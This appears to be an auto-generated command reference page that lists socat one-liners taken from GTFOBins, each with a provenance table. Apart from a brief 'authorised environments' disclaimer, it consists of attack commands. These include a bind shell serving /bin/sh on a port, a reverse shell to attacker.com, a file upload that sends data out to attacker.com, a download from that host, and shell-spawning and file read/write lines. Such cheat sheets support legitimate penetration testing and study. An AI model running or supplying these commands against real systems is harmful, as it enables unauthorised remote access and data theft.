---
parsed_by: focuslocust
source: commands
type: generated
---
# socat Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## socat

Tool page: [socat](../../tools/linux/socat.md)

### bind-shell

```text
socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat` |
| Evidence | Function example preserved from source parser. |

### download

```text
socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
socat -u file:/path/to/input-file -
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
socat -u 'exec:echo DATA' open:/path/to/output-file,creat
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat` |
| Evidence | Function example preserved from source parser. |

### shell

```text
socat - exec:/bin/sh,pty,ctty,raw,echo=0
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat` |
| Evidence | Function example preserved from source parser. |

### upload

```text
socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat` |
| Evidence | Function example preserved from source parser. |
